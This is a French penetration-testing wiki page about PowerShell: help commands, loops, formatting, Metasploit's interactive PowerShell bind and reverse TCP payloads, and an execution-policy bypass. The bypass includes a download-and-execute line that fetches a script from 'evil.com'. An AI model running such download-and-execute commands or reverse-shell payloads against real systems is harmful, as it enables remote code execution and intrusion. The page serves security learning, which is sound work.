---
title: Powershell
permalink: /Powershell/
---

Généralités
-----------

powershell.exe n'est pas "Powershell" mais juste une interface pour intéragir avec. Il est possible d'utiliser d'autres interfaces comme "Not Powershell" (https://github.com/Ben0xA/nps)

Commandes
---------

Obtenir de l'aide en powershell:

``` powershell
Get-Help Get-Command # Obtenir de l'aide sur Get-Command
Get-Help Get-Command -examples # Affiche les examples
Get-Help Get-Command -full # Affiche toute l'aide
Get-Help Get-Command -Parameter * # Affiche les paramétres
Get-Command Out* # Renvoie toutes les commandes dont le nom contient Out*
```

Pour faire des boucles:

``` powershell
Get-Process | ForEach-Object {$_.Name} # Boucle sur chaque résultat de la commande Get-Process et renvoie le nom
```

Pour faire du formatting / output:

``` powershell
Get-Process | Format-List -Property Threads, SessionId # Affiche le résultat sous forme de liste en se limitant à certaines informations
```

Session interactive
-------------------

**Note**: cette section est basée sur [Interactive sessions in PowerShell](https://www.trustedsec.com/june-2015/interactive-powershell-sessions-within-meterpreter/)

Pour obtenir une session interactive avec Powershell sous metasploit il est possible d'utiliser un des payloads dédiés dans metasploit. Il est à noter qu'il n'est pas possible de passer par meterpreter qui ne permet pas de lancer powershell après avoir fait un `shell`. Dans la version 4.11.5-2016010401 de metasploit les modules suivants sont disponibles:

``` bash
msf exploit(psexec) > search Interactive_powershell

Matching Modules
================

   Name                                        Disclosure Date  Rank    Description
   ----                                        ---------------  ----    -----------
   payload/cmd/windows/powershell_bind_tcp                      normal  Windows Interactive Powershell Session, Bind TCP
   payload/cmd/windows/powershell_reverse_tcp                   normal  Windows Interactive Powershell Session, Reverse TCP
   payload/windows/powershell_bind_tcp                          normal  Windows Interactive Powershell Session, Bind TCP
   payload/windows/powershell_reverse_tcp                       normal  Windows Interactive Powershell Session, Reverse TCP
   payload/windows/x64/powershell_bind_tcp                      normal  Windows Interactive Powershell Session, Bind TCP
   payload/windows/x64/powershell_reverse_tcp                   normal  Windows Interactive Powershell Session, Reverse TCP
```

Execution Policy
----------------

Il est possible de contourner l'execution policy ("\[...\] running scripts is disabled on this system."):

``` powershell
iex (new-object net.webclient).downloadstring('file:///C:\\Tools\\Powersploit\\Powersploit.psd1')
iex (new-object net.webclient).downloadstring('https://evil.com/powersploit.psd1')
```

-   Si powershell.exe est bloqué: il est possible d'utiliser **Not Powershell** (https://github.com/Ben0xA/nps)

Il est très important de comprendre que l'execution policy n'est pas un mécanisme de sécurité ! (Microsoft le dit lui-même)

Commandes utiles
----------------

Les commandes suivantes sont utiles à connaître lors de l'utilisation de Powershell:

Resources
---------

-   [PowerUp: A Usage Guide](http://www.harmj0y.net/blog/powershell/powerup-a-usage-guide/)
-   [PwnWiki](http://pwnwiki.io/#!scripting/powershell.md)
-   [DerbyCon - PowerShell Secrets and Tactics](https://www.youtube.com/watch?v=mPPv6_adTyg)

[Category:Technologies](/Category:Technologies "wikilink")[Category:Windows](/Category:Windows "wikilink")